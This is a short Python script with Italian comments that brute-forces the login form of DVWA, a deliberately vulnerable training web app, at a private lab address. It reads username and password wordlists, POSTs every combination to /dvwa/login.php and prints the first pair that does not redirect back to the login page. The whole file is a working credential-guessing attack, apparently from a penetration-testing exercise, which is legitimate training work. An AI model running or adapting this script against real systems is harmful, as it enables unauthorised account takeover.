import urllib.parse
import http.client

username_file = 'usernames.txt'
password_file = 'passwords.txt'
numerotentativi= 0


with open(username_file, 'r') as usernames:
	with open(password_file, 'r') as passwords:
# Leggi tutti gli usernames e le passwords in due liste separate
		username_list = usernames.readlines()
		password_list = passwords.readlines()
		
		for username in username_list :
			for password in password_list:
				username = username.strip()
				password = password.strip()
			
				password = password.rstrip()
				post_parameters =urllib.parse.urlencode({'username': username, 'password': password,'Login':'Login'})
				headers = {'Content-Type': 'application/x-www-form-urlencoded', "Accept": "text/html,application/xhtml+xml"}
				conn = http.client.HTTPConnection('192.168.50.101', 80)
				conn.request('POST', '/dvwa/login.php', post_parameters , headers)

				response = conn.getresponse()

				numerotentativi=numerotentativi+1
				new_location=response.getheader('Location')
				
				if new_location != "login.php":
					print('Login riuscito con',numerotentativi,"tentativi")
					print('Accesso riuscito -->',username,'-',password)
					conn.close()
					exit()
				else:
					print('Login non riuscito')
					conn.close()
					
print('Login non riuscito, fine ciclo')
conn.close()
